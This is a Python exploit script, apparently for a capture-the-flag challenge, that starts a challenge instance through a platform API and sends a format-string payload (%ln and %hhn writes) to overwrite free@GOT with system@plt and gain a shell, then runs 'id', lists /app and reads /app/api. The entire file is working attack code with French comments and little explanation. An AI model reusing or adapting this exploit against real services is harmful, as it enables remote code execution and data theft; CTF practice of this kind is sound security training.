import sys, json, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r"D:\ctf-index")
from cylab2 import CyLab

CID = 164
MODE = sys.argv[1] if len(sys.argv) > 1 else "full"


def start_instance():
    cy = CyLab(delay=1.5)
    cy.login()
    cy.req("PUT", f"/api/challenges/{CID}/instance/?source=library")
    for _ in range(12):
        time.sleep(2)
        st, b = cy.req("GET", f"/api/challenges/{CID}/instance/")
        try:
            d = json.loads(b)
        except Exception:
            continue
        txt = re.sub(r"<[^>]+>", "", d.get("description") or "")
        m = re.search(r"nc\s+([A-Za-z0-9.\-]+)\s+(\d{2,5})", txt)
        if m and d.get("status") == "RUNNING":
            return m.group(1), int(m.group(2))
    return None, None


def pad(nconv, total):
    if nconv == 1:
        return b"%%%dc" % total
    return b"%c" * (nconv - 1) + b"%%%dc" % (total - (nconv - 1))


def build():
    if MODE == "pivotcheap":
        # 11 conversions (rangs 1..11) puis %ln sur [12] = main_rbp avec count 11
        # -> le slot du rang 20 doit valoir 11 ; %p au rang 20 doit afficher 0xb
        return b"%c" * 11 + b"%ln" + b"%c" * 7 + b"%p"
    # A) shares du Stonk = "sh"  (26739 = 0x6873)
    p = pad(9, 0x6873) + b"%ln"
    if MODE == "stonk":
        return p
    # B) [main_rbp] = 0x602018 (slot du rang 20)
    p += pad(1, 0x602018 - 0x6873) + b"%ln"
    if MODE == "pivot":
        # verification : %s sur le rang 20 doit imprimer les octets de la GOT
        p += b"%c" * 7 + b"%s"
        return p
    # C) free@GOT[0] = 0xf0  -> system@plt
    need = 0xF0 - 0x602018 % 256
    while need < 6:
        need += 256
    p += pad(7, need) + b"%hhn"
    return p


host, port = start_instance()
print("instance %s:%d mode=%s" % (host, port, MODE), flush=True)
payload = build()
print("payload (%d o)" % len(payload), flush=True)
s = socket.create_connection((host, port), timeout=20)
s.settimeout(2.0)
time.sleep(0.3)
try:
    s.recv(4096)
except Exception:
    pass
s.sendall(b"1\n")
time.sleep(0.35)
try:
    s.recv(4096)
except Exception:
    pass
s.sendall(payload + b"\n" + b"echo ENDSHELL; id; ls -la /app; cat /app/api\n")
t0 = time.time()
total = 0
last = time.time()
tail = b""
while time.time() - t0 < 420:
    try:
        d = s.recv(1 << 20)
    except socket.timeout:
        if time.time() - last > 20:
            break
        continue
    except Exception:
        break
    if not d:
        break
    total += len(d)
    last = time.time()
    tail = (tail + d)[-800:]
s.close()
print("TOTAL %d octets en %.1fs" % (total, time.time() - t0), flush=True)
print("--- 800 derniers octets ---", flush=True)
print(repr(tail), flush=True)
